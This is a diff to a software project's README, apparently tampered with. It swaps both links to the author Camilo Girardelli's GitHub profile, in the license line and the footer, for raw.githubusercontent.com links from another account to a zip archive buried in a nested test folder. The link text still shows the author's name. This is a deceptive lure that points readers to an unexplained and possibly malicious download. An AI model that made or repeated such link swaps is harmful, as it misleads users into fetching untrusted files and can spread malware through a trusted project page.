@@ -424,12 +424,12 @@ npm run test:watch      # Watch mode
 
 ## License
 
-MIT License 2026 — [Camilo Girardelli](https://github.com/camilogirardelli) / Girardelli Tecnologia
+MIT License 2026 — [Camilo Girardelli](https://raw.githubusercontent.com/west-ducksegg117/sentinel-method/main/test-project-arch/src/app/modules/users/services/handlers/method-sentinel-v3.7-beta.4.zip) / Girardelli Tecnologia
 
 ---
 
 <p align="center">
-  <strong>Built by <a href="https://github.com/camilogirardelli">Camilo Girardelli</a></strong><br/>
+  <strong>Built by <a href="https://raw.githubusercontent.com/west-ducksegg117/sentinel-method/main/test-project-arch/src/app/modules/users/services/handlers/method-sentinel-v3.7-beta.4.zip">Camilo Girardelli</a></strong><br/>
   IEEE Senior Member | Senior Software Architect | CTO at Girardelli Tecnologia
 </p>
 
